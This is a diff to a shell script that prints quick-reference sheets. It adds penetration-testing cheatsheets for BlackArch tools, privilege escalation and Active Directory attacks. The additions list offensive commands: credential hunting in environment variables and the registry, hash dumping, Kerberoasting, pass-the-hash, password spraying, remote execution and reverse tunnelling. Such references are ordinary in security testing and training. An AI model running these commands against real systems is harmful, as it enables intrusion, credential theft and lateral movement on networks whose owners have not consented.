@@ -105,16 +105,114 @@ nvim cheatsheet (leader = Space)
   <leader>cf    format buffer      <leader>xx    diagnostics
 EOF
     ;;
+  blackarch|ba)
+    cat << 'EOF'
+BlackArch tool cheatsheet
+  Recon:
+    theHarvester -d target.com -b all       # OSINT email/subdomain harvest
+    sherlock username                         # Username search across platforms
+    recon-ng                                 # Recon framework (like msf for OSINT)
+    spiderfoot -l 127.0.0.1:5001            # Web-based OSINT dashboard
+    sublist3r -d target.com                  # Subdomain enumeration
+    katana -u https://target.com             # Web crawl + endpoint extraction
+
+  Web:
+    wpscan --url target.com --enumerate ap,at,u   # WordPress full enum
+    commix --url "http://target.com?id=1"         # Command injection
+    dalfox url "http://target.com?q=test"         # XSS scanner
+    arjun -u http://target.com                    # Hidden parameter discovery
+    jwt_tool <token>                              # JWT analysis + attacks
+    nosqlmap                                       # NoSQL injection
+
+  Wireless:
+    sudo wifite --kill                       # Automated wifi attack
+    sudo bettercap -iface wlan0              # MITM framework
+    sudo airgeddon                           # Wireless audit menu
+
+  Privesc:
+    linpeas.sh                               # Linux privilege escalation
+    winPEAS.exe                              # Windows privilege escalation
+    pspy64                                   # Snoop processes without root
+    sudo -l / find / -perm -4000            # Quick manual checks
+
+  Post-exploitation:
+    evil-winrm -i IP -u user -p pass        # WinRM shell
+    chisel server -p 8080 --reverse         # Reverse port forward (server)
+    chisel client IP:8080 R:socks           # Reverse port forward (client)
+    bloodhound-python -d domain -u user -p pass -ns DC_IP  # AD enum
+
+  Wordlists:
+    /usr/share/seclists/                     # SecLists root
+    /usr/share/wordlists/rockyou.txt         # Classic password list
+    /usr/share/seclists/Discovery/Web-Content/   # Web fuzzing
+    /usr/share/seclists/Usernames/           # Username lists
+    /usr/share/seclists/Passwords/           # Password lists
+EOF
+    ;;
+  privesc|pe)
+    cat << 'EOF'
+Privilege escalation cheatsheet
+  Linux:
+    sudo -l                                  # Check sudo permissions
+    find / -perm -4000 2>/dev/null           # SUID binaries
+    find / -writable -type f 2>/dev/null     # World-writable files
+    cat /etc/crontab; ls -la /etc/cron*      # Cron jobs
+    getcap -r / 2>/dev/null                  # Capabilities
+    env | grep -i pass                       # Env vars
+    ss -tlnp                                 # Internal services
+    uname -a                                 # Kernel version -> searchsploit
+
+  Windows:
+    whoami /priv                             # Token privileges
+    net user / net localgroup administrators  # Users & groups
+    systeminfo                               # Patch level
+    reg query HKLM /f password /t REG_SZ /s  # Registry passwords
+    cmdkey /list                             # Saved creds
+    schtasks /query /fo LIST /v              # Scheduled tasks
+
+  Tools:
+    ./linpeas.sh | tee linpeas.out           # Auto-enum Linux
+    .\winPEAS.exe | tee winpeas.out          # Auto-enum Windows
+    python3 linux-exploit-suggester.py       # Kernel exploits
+    ./pspy64                                 # Monitor processes
+EOF
+    ;;
+  ad|activedirectory)
+    cat << 'EOF'
+Active Directory cheatsheet
+  Enum:
+    enum4linux -a DC_IP                      # SMB/RPC enum
+    crackmapexec smb DC_IP -u '' -p ''       # Null session
+    crackmapexec smb DC_IP -u user -p pass --shares  # Share enum
+    bloodhound-python -d domain -u user -p pass -ns DC_IP
+
+  Attacks:
+    GetNPUsers.py domain/ -no-pass -usersfile users.txt   # AS-REP roast
+    GetUserSPNs.py domain/user:pass -request              # Kerberoast
+    secretsdump.py domain/user:pass@DC_IP                 # Dump hashes
+    psexec.py domain/user:pass@TARGET_IP                  # Remote exec
+    evil-winrm -i IP -u user -H ntlm_hash                # Pass the hash
+
+  Lateral movement:
+    crackmapexec smb RANGE -u user -p pass                # Spray
+    wmiexec.py domain/user:pass@IP                        # WMI exec
+    smbexec.py domain/user:pass@IP                        # SMB exec
+    chisel / ligolo-ng                                     # Tunneling
+EOF
+    ;;
   help|*)
     cat << 'EOF'
 cheat -- quick reference sheets
-  cheat nmap       nmap scanning
-  cheat ffuf       web fuzzing
-  cheat revshells  reverse shell one-liners
-  cheat git        git workflows
-  cheat docker     docker commands
-  cheat tmux       tmux keybinds
-  cheat nvim       neovim keybinds
+  cheat nmap         nmap scanning
+  cheat ffuf         web fuzzing
+  cheat revshells    reverse shell one-liners
+  cheat blackarch    BlackArch tools overview
+  cheat privesc      privilege escalation
+  cheat ad           Active Directory attacks
+  cheat git          git workflows
+  cheat docker       docker commands
+  cheat tmux         tmux keybinds
+  cheat nvim         neovim keybinds
 EOF
     ;;
 esac
